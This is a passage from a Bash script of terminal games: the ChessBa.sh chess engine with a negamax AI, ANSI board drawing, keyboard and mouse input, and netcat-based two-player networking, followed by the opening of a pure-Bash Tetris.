	if (( fromX == toX && to == 0 && ( toY - fromY == player || ( toY - fromY == 2 * player && ${field["$((player + fromY)),$fromX"]} == 0 && fromY == ( player > 0 ? 1 : 6 ) ) ) )); then
		return 0
		else
		return $(( ! ( (fromX - toX) * (fromX - toX) == 1 && toY - fromY == player && to * player < 0 ) ))
	fi
# queen, rock and bishop
elif (( fig == 5 || fig == 4  || fig == 3 )); then
# rock - and queen
	if (( fig != 3 )); then
	if (( fromX == toX )); then
		for (( i = ( fromY < toY ? fromY : toY ) + 1 ; i < ( fromY > toY ? fromY : toY ) ; i++ )); do
		if (( ${field[$i,$fromX]} != 0 )); then
			return 1
			fi
			done
			return 0
elif (( fromY == toY )); then
	for (( i = ( fromX < toX ? fromX : toX ) + 1 ; i < ( fromX > toX ? fromX : toX ) ; i++ )); do
	if (( ${field[$fromY,$i]} != 0 )); then
			return 1
			fi
			done
			return 0
		fi
	fi
# bishop - and queen
if (( fig != 4 )); then
	if (( ( fromY - toY ) * ( fromY - toY ) != ( fromX - toX ) * ( fromX - toX ) )); then
	return 1
	fi
	for (( i = 1 ; i < ( $fromY > toY ? fromY - toY : toY - fromY) ; i++ )); do
	if (( ${field[$((fromY + i * (toY - fromY > 0 ? 1 : -1 ) )),$(( fromX + i * (toX - fromX > 0 ? 1 : -1 ) ))]} != 0 )); then
		return 1
		fi
		done
		return 0
fi
# nothing found? wrong move.
	return 1
# knight
elif (( fig == 2 )); then
	return $(( ! ( ( ( fromY - toY == 2 || fromY - toY == -2) && ( fromX - toX == 1 || fromX - toX == -1 ) ) || ( ( fromY - toY == 1 || fromY - toY == -1) && ( fromX - toX == 2 || fromX - toX == -2 ) ) ) ))
# king
elif (( fig == 6 )); then
	return $(( !( ( ( fromX - toX ) * ( fromX - toX ) ) <= 1 &&  ( ( fromY - toY ) * ( fromY - toY ) ) <= 1 ) ))
# invalid figure
else
	error "Invalid figure '$from'!"
	exit 1
fi
}
# minimax (game theory) algorithm for evaluate possible movements
# (the heart of your computer enemy)
# currently based on negamax with alpha/beta pruning and transposition tables liked described in
# http://en.wikipedia.org/wiki/Negamax#NegaMax_with_Alpha_Beta_Pruning_and_Transposition_Tables
# Params:
#	$1	current search depth
#	$2	alpha (for pruning)
#	$3	beta (for pruning)
#	$4	current moving player
#	$5	preserves the best move (for ai) if true
# Returns best value as status code
function negamax() {
local depth=$1
local a=$2
local b=$3
local player=$4
local save=$5
# transposition table
local aSave=$a
local hash
hash="$player ${field[@]}"
if ! $save && test "${cacheLookup[$hash]+set}" && (( ${cacheDepth[$hash]} >= depth )); then
	local value=${cacheLookup[$hash]}
	local flag=${cacheFlag[$hash]}
	if (( flag == 0 )); then
		return $value
	elif (( flag == 1 && value > a )); then
		a=$value
	elif (( flag == -1 && value < b )); then
		b=$value
	fi
	if (( a >= b )); then
		return $value
	fi
fi
# lost own king?
if ! hasKing "$player"; then
	cacheLookup[$hash]=$(( strength - depth + 1 ))
	cacheDepth[$hash]=$depth
	cacheFlag[$hash]=0
	return $(( strength - depth + 1 ))
# use heuristics in depth
elif (( depth <= 0 )); then
	local values=0
	for (( y=0; y<8; y++ )); do
		for (( x=0; x<8; x++ )); do
			local fig=${field[$y,$x]}
			if (( ${field[$y,$x]} != 0 )); then
				local figPlayer=$(( fig < 0 ? -1 : 1 ))
# a more simple heuristic would be values=$(( $values + $fig ))
	(( values += ${figValues[$fig * $figPlayer]} * figPlayer ))
# pawns near to end are better
if (( fig == 1 )); then
	if (( figPlayer > 0 )); then
	(( values += ( y - 1 ) / 2 ))
else
	(( values -= ( 6 + y ) / 2 ))
fi
fi
fi
done
done
	values=$(( 127 + ( player * values ) ))
# ensure valid bash return range
if (( values > 253 - strength )); then
	values=$(( 253 - strength ))
elif (( values < 2 + strength )); then
	values=$(( 2 + strength ))
fi
	cacheLookup[$hash]=$values
	cacheDepth[$hash]=0
	cacheFlag[$hash]=0
	return $values
# calculate best move
else
	local bestVal=0
	local fromY
	local fromX
	local toY
	local toX
	local i
	local j
	for (( fromY=0; fromY<8; fromY++ )); do
		for (( fromX=0; fromX<8; fromX++ )); do
		local fig=$(( ${field[$fromY,$fromX]} * ( player ) ))
# precalc possible fields (faster then checking every 8*8 again)
	local targetY=()
	local targetX=()
	local t=0
# empty or enemy
if (( fig <= 0 )); then
	continue
# pawn
elif (( fig == 1 )); then
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX ))
	(( t += 1 ))
	targetY[$t]=$(( 2 * player + fromY ))
	targetX[$t]=$(( fromX ))
	(( t += 1 ))
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX + 1 ))
	(( t += 1 ))
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX - 1 ))
	(( t += 1 ))
# knight
elif (( fig == 2 )); then
	for (( i=-1 ; i<=1 ; i=i+2 )); do
	for (( j=-1 ; j<=1 ; j=j+2 )); do
		targetY[$t]=$(( fromY + 1 * i ))
		targetX[$t]=$(( fromX + 2 * j ))
		(( t + 1 ))
		targetY[$t]=$(( fromY + 2 * i ))
		targetX[$t]=$(( fromX + 1 * j ))
		(( t + 1 ))
done
done
# king
elif (( fig == 6 )); then
	for (( i=-1 ; i<=1 ; i++ )); do
	for (( j=-1 ; j<=1 ; j++ )); do
	targetY[$t]=$(( fromY + i ))
	targetX[$t]=$(( fromX + j ))
	(( t += 1 ))
	done
done
else
# bishop or queen
if (( fig != 4 )); then
	for (( i=-8 ; i<=8 ; i++ )); do
	if (( i != 0 )); then
# can be done nicer but avoiding two loops!
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
	fi
	done
fi
# rock or queen
if (( fig != 3 )); then
	for (( i=-8 ; i<=8 ; i++ )); do
	if (( i != 0 )); then
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX ))
		(( t += 1 ))
		targetY[$t]=$(( fromY ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
	fi
	done
	fi
fi
# process all available moves
for (( j=0; j < t; j++ )); do
	local toY=${targetY[$j]}
	local toX=${targetX[$j]}
# move is valid
if (( toY >= 0 && toY < 8 && toX >= 0 && toX < 8 )) &&  canMove "$fromY" "$fromX" "$toY" "$toX" "$player"; then
	local oldFrom=${field[$fromY,$fromX]};
	local oldTo=${field[$toY,$toX]};
	field[$fromY,$fromX]=0
	field[$toY,$toX]=$oldFrom
# pawn to queen
if (( oldFrom == player && toY == ( player > 0 ? 7 : 0 ) )); then
	field["$toY,$toX"]=$(( 5 * player ))
fi
# recursion
negamax $(( depth - 1 )) $(( 255 - b )) $(( 255 - a )) $(( player * (-1) )) false
local val=$(( 255 - $? ))
field[$fromY,$fromX]=$oldFrom
field[$toY,$toX]=$oldTo
	if (( val > bestVal )); then
		bestVal=$val
	if $save; then
		selectedX=$fromX
		selectedY=$fromY
		selectedNewX=$toX
		selectedNewY=$toY
	fi
	fi
	if (( val > a )); then
		a=$val
	fi
	if (( a >= b )); then
		break 3
	fi
	fi
		done
	done
done
cacheLookup[$hash]=$bestVal
cacheDepth[$hash]=$depth
	if (( bestVal <= aSave )); then
		cacheFlag[$hash]=1
	elif (( bestVal >= b )); then
		cacheFlag[$hash]=-1
	else
		cacheFlag[$hash]=0
	fi
	return $bestVal
	fi
}
# Perform a concrete single movement
# Params:
# 	$1	current player
# Globals:
#	$selectedY
#	$selectedX
#	$selectedNewY
#	$selectedNewX
# Return status code 0 if movement was successfully performed
function move() {
	local player=$1
	if canMove "$selectedY" "$selectedX" "$selectedNewY" "$selectedNewX" "$player"; then
		local fig=${field[$selectedY,$selectedX]}
		field[$selectedY,$selectedX]=0
		field[$selectedNewY,$selectedNewX]=$fig
		# pawn to queen
		if (( fig == player && selectedNewY == ( player > 0 ? 7 : 0 ) )); then
			field[$selectedNewY,$selectedNewX]=$(( 5 * player ))
		fi
		return 0
	fi
	return 1
}
# Unicode helper function (for draw)
# Params:
#	$1	first hex unicode character number
#	$2	second hex unicode character number
#	$3	third hex unicode character number
#	$4	integer offset of third hex
# Outputs escape character
function unicode() {
	if ! $ascii; then
		printf '\\x%s\\x%s\\x%x' "$1" "$2" "$(( 0x$3 + ( $4 ) ))"
	fi
}
# Ascii helper function (for draw)
# Params:
#	$1	decimal ascii character number
# Outputs escape character
	function ascii() {
		echo -en "\x$1"
}
# Get ascii code number of character
# Params:
#	$1	ascii character
# Outputs decimal ascii character number
	function ord() {
		LC_CTYPE=C printf '%d' "'$1"
}
# Audio and visual bell
# No params or return
	function bell() {
		if (( lastBell != SECONDS )); then
			echo -en "\a\e[?5h"
			sleep 0.1
			echo -en "\e[?5l"
			lastBell=$SECONDS
		fi
}
# Draw one field (of the gameboard)
# Params:
#	$1	y coordinate
#	$2	x coordinate
#	$3	true if cursor should be moved to position
# Outputs formated field content
function drawField(){
	local y=$1
	local x=$2
	echo -en "\e[0m"
	# move coursor to absolute position
	if $3 ;then
		local yScr=$(( y + originY ))
		local xScr=$(( x * 2 + originX ))
		if $ascii && (( x >= 0 )); then
			local xScr=$(( x * 3 + originX ))
		fi
	echo -en "\e[${yScr};${xScr}H"
	fi
# draw vertical labels
if (( x==labelX && y >= 0 && y < 8)); then
	if $hoverInit && (( hoverY == y )); then
		if $color; then
			echo -en "\e[3${colorHover}m"
		else
			echo -en "\e[4m"
		fi
	elif (( selectedY == y )); then
		if ! $color; then
			echo -en "\e[2m"
		elif (( ${field[$selectedY,$selectedX]} < 0 )); then
			echo -en "\e[3${colorPlayerA}m"
		else
			echo -en "\e[3${colorPlayerB}m"
		fi
	fi
	# line number (alpha numeric)
	if $unicodelabels; then
		echo -en "$(unicode e2 92 bd -$y) "
	else
		echo -en " \x$((48 - $y))"
	fi
# clear format
# draw horizontal labels
elif (( x>=0 && y==labelY )); then
	if $hoverInit && (( hoverX == x )); then
		if $color; then
			echo -en "\e[3${colorHover}m"
		else
			echo -en "\e[4m"
		fi
	elif (( selectedX == x )); then
		if ! $color; then
			echo -en "\e[2m"
		elif (( ${field[$selectedY,$selectedX]} < 0 )); then
			echo -en "\e[3${colorPlayerA}m"
		else
			echo -en "\e[3${colorPlayerB}m"
		fi
	else
		echo -en "\e[0m"
	fi
	if $unicodelabels; then
		echo -en "$(unicode e2 9e 80 $x )\e[0m "
	else
		if $ascii; then
			echo -n " "
		fi
		echo -en "\x$((31 + $x))\e[0m "
		fi
	# draw field
	elif (( y >=0 && y < 8 && x >= 0 && x < 8 )); then
		local f=${field["$y,$x"]}
		local black=false
			if (( ( x + y ) % 2 == 0 )); then
				local black=true
			fi
			# black/white fields
			if $black; then
				if $color; then
					echo -en "\e[47;107m"
				else
					echo -en "\e[7m"
				fi
			else
				$color && echo -en "\e[40m"
			fi
	# background
	if $hoverInit && (( hoverX == x && hoverY == y )); then
		if ! $color; then
			echo -en "\e[4m"
		elif $black; then
			echo -en "\e[4${colorHover};10${colorHover}m"
		else
			echo -en "\e[4${colorHover}m"
		fi
	elif (( selectedX != -1 && selectedY != -1 )); then
		local selectedPlayer=$(( ${field[$selectedY,$selectedX]} > 0 ? 1 : -1 ))
		if (( selectedX == x && selectedY == y )); then
			if ! $color; then
				echo -en "\e[2m"
			elif $black; then
				echo -en "\e[47m"
			else
				echo -en "\e[40;100m"
			fi
	elif $color && $colorHelper && canMove "$selectedY" "$selectedX" "$y" "$x" "$selectedPlayer"; then
		if $black; then
			if (( selectedPlayer < 0 )); then
				echo -en "\e[4${colorPlayerA};10${colorPlayerA}m"
			else
				echo -en "\e[4${colorPlayerB};10${colorPlayerB}m"
			fi
		else
			if (( selectedPlayer < 0 )); then
				echo -en "\e[4${colorPlayerA}m"
			else
				echo -en "\e[4${colorPlayerB}m"
			fi
		fi
	fi
fi
	# empty field?
	if ! $ascii && (( f == 0 )); then
		echo -en "  "
	else
		# figure colors
		if $color; then
			if (( selectedX == x && selectedY == y )); then
				if (( f < 0 )); then
					echo -en "\e[3${colorPlayerA}m"
				else
					echo -en "\e[3${colorPlayerB}m"
				fi
			else
				if (( f < 0 )); then
					echo -en "\e[3${colorPlayerA};9${colorPlayerA}m"
				else
					echo -en "\e[3${colorPlayerB};9${colorPlayerB}m"
				fi
			fi
		fi
		# unicode figures
		if $ascii; then
			echo -en " \e[1m${asciiNames[ $f + 6 ]} "
		elif (( f > 0 )); then
			if $color && $colorFill; then
				echo -en "$( unicode e2 99 a0 -$f ) "
			else
				echo -en "$( unicode e2 99 9a -$f ) "
			fi
		else
			echo -en "$( unicode e2 99 a0 $f ) "
		fi
	fi
# three empty chars
elif $ascii && (( x >= 0 )); then
	echo -n "   "
# otherwise: two empty chars (on unicode boards)
else
	echo -n "  "
fi
# clear format
	echo -en "\e[0m\e[8m"
}
# Draw the battlefield
# (no params / return value)
function draw() {
	local ty
	local tx
	$useStty && stty -echo
	$cursor || echo -e "\e[2J"
	echo -e "\e[H\e[?25l\e[0m\n\e[K$title\e[0m\n\e[K"
	for (( ty=0; ty<10; ty++ )); do
		for (( tx=-2; tx<8; tx++ )); do
			if $cursor; then
				local t
				t="$(drawField "$ty" "$tx" true)"
				if [[ "${redraw[$ty,$tx]}" != "$t" ]]; then
					echo -n "$t"
					redraw[$ty,$tx]="$t"
					log="[$ty,$tx]"
				fi
			else
				drawField "$ty" "$tx" false
			fi
		done
	$cursor || echo ""
	done
	$useStty && stty echo
	# clear format
	echo -en "\e[0m\e[$(( originY + 10 ));0H\e[2K\n\e[2K$message\e[8m"
}
# Read the next move coordinates
# from keyboard (direct access or cursor keypad)
# or use mouse input (if available)
# Returns 0 on success and 1 on abort
function inputCoord(){
	inputY=-1
	inputX=-1
	local ret=0
	local t
	local tx
	local ty
	local oldHoverX=$hoverX
	local oldHoverY=$hoverY
	IFS=''
	$useStty && stty echo
	if $mouse; then
		echo -en "\e[?9h"
	fi
	while (( inputY < 0 || inputY >= 8 || inputX < 0  || inputX >= 8 )); do
		read -sN1 a
		case "$a" in
			$'\e')
			if read -t0.1 -sN2 b; then
				case "$b" in
					'[A' | 'OA')
						hoverInit=true
						if (( --hoverY < 0 )); then
							hoverY=0
							bell
						fi ;;
					'[B' | 'OB')
						hoverInit=true
						if (( ++hoverY > 7 )); then
							hoverY=7
							bell
						fi ;;
					'[C' | 'OC')
						hoverInit=true
						if (( ++hoverX > 7 )); then
							hoverX=7
							bell
						fi ;;
					'[D' | 'OD')
						hoverInit=true
						if (( --hoverX < 0 )); then
							hoverX=0
							bell
						fi ;;
					'[3')
						ret=1
						bell
						break ;;
					'[5')
						hoverInit=true
							if (( hoverY == 0 )); then
								bell
							else
								hoverY=0
							fi ;;
					'[6')
						hoverInit=true
						if (( hoverY == 7 )); then
							bell
						else
							hoverY=7
						fi ;;
					'OH')
						hoverInit=true
						if (( hoverX == 0 )); then
							bell
						else
							hoverX=0
						fi ;;
					'OF')
						hoverInit=true
						if (( hoverX == 7 )); then
							bell
						else
							hoverX=7
						fi ;;
					'[M')
						read -sN1 t
						read -sN1 tx
						read -sN1 ty
						ty=$(( $(ord "$ty") - 32 - originY ))
						if $ascii; then
							tx=$(( ( $(ord "$tx") - 32 - originX) / 3 ))
						else
							tx=$(( ( $(ord "$tx") - 32 - originX) / 2 ))
						fi
						if (( tx >= 0 && tx < 8 && ty >= 0 && ty < 8 )); then
							inputY=$ty
							inputX=$tx
							hoverY=$ty
							hoverX=$tx
						else
							ret=1
							bell
							break
						fi ;;
					*) bell
				esac
			else
				ret=1
				bell
				break
			fi ;;
			$'\t' | $'\n' | ' ')
				if $hoverInit; then
					inputY=$hoverY
					inputX=$hoverX
				fi ;;
			'~') ;;
			$'\x7f' | $'\b')
				ret=1
				bell
				break ;;
			[A-Ha-h])
				t=$(ord $a)
				if (( t < 90 )); then
					inputY=$(( 72 - $(ord $a) ))
				else
					inputY=$(( 104 - $(ord $a) ))
				fi
				hoverY=$inputY ;;
			[1-8])
				inputX=$(( a - 1 ))
				hoverX=$inputX ;;
			*) bell ;;
		esac
		if $hoverInit && (( oldHoverX != hoverX || oldHoverY != hoverY )); then
			oldHoverX=$hoverX
			oldHoverY=$hoverY
			draw
		fi
	done
	if $mouse; then
		echo -en "\e[?9l"
	fi
		$useStty && stty -echo
	return $ret
}
# Player input
# (reads a valid user movement)
# Params
# 	$1	current (user) player
# Returns status code 0
function input() {
	local player=$1
	SECONDS=0
	message="\e[1m$(namePlayer "$player")\e[0m: Move your figure"
	while true; do
		selectedY=-1
		selectedX=-1
		title="It's $(namePlayer "$player")s turn"
		draw >&3
		if inputCoord; then
			selectedY=$inputY
			selectedX=$inputX
			if (( ${field["$selectedY,$selectedX"]} == 0 )); then
				warn "You cannot choose an empty field!" >&3
			elif (( ${field["$selectedY,$selectedX"]} * player  < 0 )); then
				warn "You cannot choose your enemies figures!" >&3
			else
				send "$player" "$selectedY" "$selectedX"
				local figName=$(nameFigure ${field[$selectedY,$selectedX]} )
				message="\e[1m$(namePlayer "$player")\e[0m: Move your \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to"
				draw >&3
				if inputCoord; then
					selectedNewY=$inputY
					selectedNewX=$inputX
						if (( selectedNewY == selectedY && selectedNewX == selectedX )); then
							warn "You didn't move..." >&3
						elif (( ${field[$selectedNewY,$selectedNewX]} * $player > 0 )); then
							warn "You cannot kill your own figures!" >&3
						elif move "$player"; then
							title="$(namePlayer "$player") moved the \e[3m$figName\e[0m from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX") \e[2m(took him $SECONDS seconds)\e[0m"
							send "$player" "$selectedNewY" "$selectedNewX"
							return 0
						else
							warn "This move is not allowed!" >&3
						fi
					# Same position again --> revoke
					send "$player" "$selectedY" "$selectedX"
				fi
			fi
		fi
	done
}
# AI interaction
# (calculating movement)
# Params
# 	$1	current (ai) player
# Verbose movement messages to stdout
function ai() {
	local player=$1
	local val
	SECONDS=0
	title="It's $(namePlayer "$player")s turn"
	message="Computer player \e[1m$(namePlayer "$player")\e[0m is thinking..."
	draw >&3
	negamax "$strength" 0 255 "$player" true
	val=$?
	local figName
	figName=$(nameFigure ${field[$selectedY,$selectedX]} )
	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX")..."
	draw >&3
	send "$player" "$selectedY" "$selectedX"
	sleep "$sleep"
	if move $player; then
		message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX")"
		draw >&3
		send "$player" "$selectedNewY" "$selectedNewX"
		sleep "$sleep"
		title="$( namePlayer "$player" ) moved the $figName from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX" ) (took him $SECONDS seconds)."
	else
		error "AI produced invalid move - that should not hapen!"
	fi
}
# Read row from remote
# Returns row (0-7) as status code
function receiveY() {
	local i
	while true; do
		read -n 1 i
		case $i in
			[hH]) return 0 ;;
			[gG]) return 1 ;;
			[fF]) return 2 ;;
			[eE]) return 3 ;;
			[dD]) return 4 ;;
			[cC]) return 5 ;;
			[bB]) return 6 ;;
			[aA]) return 7 ;;
			*)
			if $warnings; then
				warn "Invalid input '$i' for row from network (character between 'A' and 'H' required)!"
			fi
		esac
	done
}
# Read column from remote
# Returns column (0-7) as status code
function receiveX() {
	local i
	while true; do
		read -n 1 i
		case $i in
			[1-8]) return $(( i - 1 )) ;;
			*)
				if $warnings; then
					warn "Invalid input '$i' for column from network (character between '1' and '8' required)!"
				fi ;;
		esac
	done
}
# receive movement from connected player
# (no params/return value)
function receive() {
local player=$remote
SECONDS=0
title="It's $(namePlayer "$player")s turn"
message="Network player \e[1m$(namePlayer "$player")\e[0m is thinking... (or sleeping?)"
draw >&3
while true; do
	receiveY
	selectedY=$?
	receiveX
	selectedX=$?
	local figName
	figName=$(nameFigure ${field[$selectedY,$selectedX]} )
	message"\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX)..."
	draw >&3
	receiveY
	selectedNewY=$?
	receiveX
	selectedNewX=$?
	if (( selectedNewY == selectedY && selectedNewX == selectedX )); then
		selectedY=-1
		selectedX=-1
		selectedNewY=-1
		selectedNewX=-1
		message="\e[1m$( namePlayer "$player" )\e[0m revoked his move... okay, that'll be time consuming"
		draw >&3
	else
		break
	fi
done
if move $player; then
	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX)"
	draw >&3
	sleep "$sleep"
	title="$( namePlayer $player ) moved the $figName from $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX) (took him $SECONDS seconds)."
else
	error "Received invalid move from network - that should not hapen!"
fi
}
# Write coordinates to network
# Params:
#	$1	player
#	$2	row
#	$3	column
# (no return value/exit code)
function send() {
	local player=$1
	local y=$2
	local x=$3
	if (( remote == player * (-1) )); then
		sleep "$remotedelay"
		coord "$y" "$x"
		echo
		sleep "$remotedelay"
	fi
}
# Import transposition tables
# by reading serialised cache from stdin
# (no params / return value)
function importCache() {
	while IFS=$'\t' read hash lookup depth flag; do
		cacheLookup["$hash"]=$lookup
		cacheDepth["$hash"]=$depth
		cacheFlag["$hash"]=$flag
	done
}
# Export transposition tables
# Outputs serialised cache (to stdout)
# (no params / return value)
function exportCache() {
	for hash in "${!cacheLookup[@]}"; do
		echo -e "$hash\t${cacheLookup[$hash]}\t${cacheDepth[$hash]}\t${cacheFlag[$hash]}"
	done
}
# Trap function for exporting cache
# (no params / return value)
function exitCache() {
	# permanent cache: export
	if [[ -n "$cache" ]]; then
		echo -en "\r\n\e[2mExporting cache..." >&3
		if $cachecompress; then
			exportCache | gzip > "$cache"
		else
			exportCache > "$cache"
		fi
		echo -e " done!\e[0m" >&3
	fi
}
# Perform necessary tasks for exit
# like deleting files and measuring runtime
# (no params / return value)
function end() {
# remove pipe
	if [[ -n "$fifopipe" && -p "$fifopipe" ]]; then
		rm "$fifopipe"
	fi
# disable mouse
	if $mouse; then
		echo -en "\e[?9l"
	fi
# enable input
	stty echo
# restore screen
	if $cursor; then
		echo -en "\e[2J\e[?47l\e[?25h\e[u\e8"
	fi
# exit message
	duration=$(( $( date +%s%N ) - timestamp ))
	seconds=$(( duration / 1000000000 ))
	echo -e "\r\n\e[2mYou've wasted $seconds,$(( duration -( seconds * 1000000000 ))) seconds of your lifetime playing with a Bash script.\e[0m\n"
}
# Exit trap
trap "end" 0
# setting up requirements for network
piper="cat"
fifopipe="/dev/fd/1"
initializedGameLoop=true
if (( remote != 0 )); then
	require nc
	require mknod
	initializedGameLoop=false
	if (( remote == 1 )); then
		fifopipe="$fifopipeprefix.server"
		piper="nc -l $port"
	else
		fifopipe="$fifopipeprefix.client"
		piper="nc $remoteip $port"
		echo -e "\e[1mWait!\e[0mPlease make sure the Host (the other Player) has started before continuing.\e[0m"
		anyKey
	fi
	if [[ ! -e "$fifopipe" ]]; then
		mkfifo "$fifopipe"
	fi
	if [[ ! -p "$fifopipe" ]]; then
		echo "Could not create FIFO pipe '$fifopipe'!" >&2
	fi
fi

# print welcome title
title="Welcome to ChessBa.sh"
if isAI "1" || isAI "-1"; then
	title="$title - your room heater tool!"
fi

# permanent cache: import
if [[ -n "$cache" && -f "$cache" ]]; then
	echo -en "\n\n\e[2mImporting cache..."
	if $cachecompress; then
		importCache < <( zcat "$cache" )
	else
		importCache < "$cache"
	fi
	echo -e " done\e[0m"
fi
# main game loop
{
p=1
while true; do
# initialize remote connection on first run
	if ! $initializedGameLoop; then
		# set cache export trap
		trap "exitCache" 0
		warn "Waiting for the other network player to be ready..." >&3
		# exchange names
		if (( remote == -1 )); then
			read namePlayerA < $fifopipe
			echo "$namePlayerB"
			echo "connected with first player." >&3
		elif (( remote == 1 )); then
			echo "$namePlayerA"
			read namePlayerB < $fifopipe
			echo "connected with second player." >&3
		fi
# set this loop initialized
		initializedGameLoop=true
	fi
# reset global variables
	selectedY=-1
	selectedX=-1
	selectedNewY=-1
	selectedNewX=-1
# switch current player
	(( p *= (-1) ))
# check check (or: if the king is lost)
	if hasKing "$p"; then
		if (( remote == p )); then
			receive < $fifopipe
		elif isAI "$p"; then
			if (( computer-- == 0 )); then
			echo "Stopping - performed all ai steps" >&3
		exit 0
			fi
			ai "$p"
		else
			input "$p"
		fi
	else
		title="Game Over!"
		message="\e[1m$(namePlayer $(( p * (-1) )) ) wins the game!\e[1m\n"
		draw >&3
		anyKey
		exit 0
	fi
done | $piper > "$fifopipe"
# check exit code
	netcatExit=$?
	gameLoopExit=${PIPESTATUS[0]}
	if (( netcatExit != 0 )); then
		error "Network failure!"
	elif (( gameLoopExit != 0 )); then
		error "The game ended unexpected!"
	fi
} 3>&1
}
##
#----Pass time tetris
##
tetris_game() {
# Tetris game written in pure bash
# I tried to mimic as close as possible original tetris game
# which was implemented on old soviet DVK computers (PDP-11 clones)
# Videos of this tetris can be found here:
# http://www.youtube.com/watch?v=O0gAgQQHFcQ
# http://www.youtube.com/watch?v=iIQc1F3UuV4
# This script was created on ubuntu 13.04 x64 and bash 4.2.45(1)-release.
# It was not tested on other unix like operating systems.
# Enjoy :-)!
# Author: Kirill Timofeev <kt97679@gmail.com>
set -u # non initialized variable is an error
# 2 signals are used: SIGUSR1 to decrease delay after level up and SIGUSR2 to quit
# they are sent to all instances of this script
# because of that we should process them in each instance
# in this instance we are ignoring both signals
trap '' SIGUSR1 SIGUSR2
# Those are commands sent to controller by key press processing code
# In controller they are used as index to retrieve actual functuon from array
local QUIT=0
local RIGHT=1
local LEFT=2
local ROTATE=3
local DOWN=4
local DROP=5
local TOGGLE_HELP=6
local TOGGLE_NEXT=7
local TOGGLE_COLOR=8
local DELAY=1          # initial delay between piece movements
local DELAY_FACTOR=0.8 # this value controld delay decrease for each level up
# color codes
local RED=1
local GREEN=2
local YELLOW=3
local BLUE=4
local FUCHSIA=5
local CYAN=6
local WHITE=7
# Location and size of playfield, color of border
local PLAYFIELD_W=10
local PLAYFIELD_H=20
local PLAYFIELD_X=30
local PLAYFIELD_Y=1
local BORDER_COLOR=$YELLOW
# Location and color of score information
local SCORE_X=1
local SCORE_Y=2
local SCORE_COLOR=$GREEN
# Location and color of help information
local HELP_X=58
local HELP_Y=1
local HELP_COLOR=$CYAN
# Next piece location
local NEXT_X=14
local NEXT_Y=11
# Location of "game over" in the end of the game
local GAMEOVER_X=1
local GAMEOVER_Y=$((PLAYFIELD_H + 3))
# Intervals after which game level (and game speed) is increased 
local LEVEL_UP=20
local colors=($RED $GREEN $YELLOW $BLUE $FUCHSIA $CYAN $WHITE)
local no_color=true    # do we use color or not
local showtime=true    # controller runs while this flag is true
local empty_cell=" ."  # how we draw empty cell
local filled_cell="[]" # how we draw filled cell
local score=0           # score variable initialization
local level=1           # level variable initialization
local lines_completed=0 # completed lines counter initialization
# screen_buffer is variable, that accumulates all screen changes
# this variable is printed in controller once per game cycle
puts() {
	screen_buffer+=${1}
}
# move cursor to (x,y) and print string
# (1,1) is upper left corner of the screen
xyprint() {
	puts "\033[${2};${1}H${3}"
}
show_cursor() {
	echo -ne "\033[?25h"
}
hide_cursor() {
	echo -ne "\033[?25l"
}
# foreground color
set_fg() {
	$no_color && return
	puts "\033[3${1}m"
}
# background color
set_bg() {
	$no_color && return
	puts "\033[4${1}m"
}
reset_colors() {
	puts "\033[0m"
}
set_bold() {
	puts "\033[1m"
}
# playfield is 1-dimensional array, data is stored as follows:
# [ a11, a21, ... aX1, a12, a22, ... aX2, ... a1Y, a2Y, ... aXY]
#   |<  1st line   >|  |<  2nd line   >|  ... |<  last line  >|
# X is PLAYFIELD_W, Y is PLAYFIELD_H
# each array element contains cell color value or -1 if cell is empty
redraw_playfield() {
	local j i x y xp yp
	((xp = PLAYFIELD_X))
	for ((y = 0; y < PLAYFIELD_H; y++)) {
		((yp = y + PLAYFIELD_Y))
		((i = y * PLAYFIELD_W))
		xyprint "$xp" "$yp" ""
		for ((x = 0; x < PLAYFIELD_W; x++)) {
			((j = i + x))
		if ((${play_field[$j]} == -1)); then
			puts "$empty_cell"
		else
			set_fg "${play_field[$j]}"
			set_bg "${play_field[$j]}"
			puts "$filled_cell"
			reset_colors
		fi
		}
	}
}
update_score() {
# Arguments: 1 - number of completed lines
	((lines_completed += $1))
# Unfortunately I don't know scoring algorithm of original tetris
# Here score is incremented with squared number of lines completed
# this seems reasonable since it takes more efforts to complete several lines at once
	((score += ($1 * $1)))
	if (( score > LEVEL_UP * level)); then          # if level should be increased
		((level++))                                  # increment level
		pkill -SIGUSR1 -f "/bin/bash $0" # and send SIGUSR1 signal to all instances of this script (please see ticker for more details)
	fi
	set_bold
	set_fg $SCORE_COLOR
	xyprint $SCORE_X $SCORE_Y         "Lines completed: $lines_completed"
	xyprint $SCORE_X $((SCORE_Y + 1)) "Level:           $level"
	xyprint $SCORE_X $((SCORE_Y + 2)) "Score:           $score"
	reset_colors
}
help=(
"  Use cursor keys"
"       or"
"      s: up"
"a: left,  d: right"
"    space: drop"
"      q: quit"
"  c: toggle color"
"n: toggle show next"
"h: toggle this help"
)
help_on=-1 # if this flag is 1 help is shown
toggle_help() {
	local i s
	set_bold
	set_fg $HELP_COLOR
	for ((i = 0; i < ${#help[@]}; i++ )) {
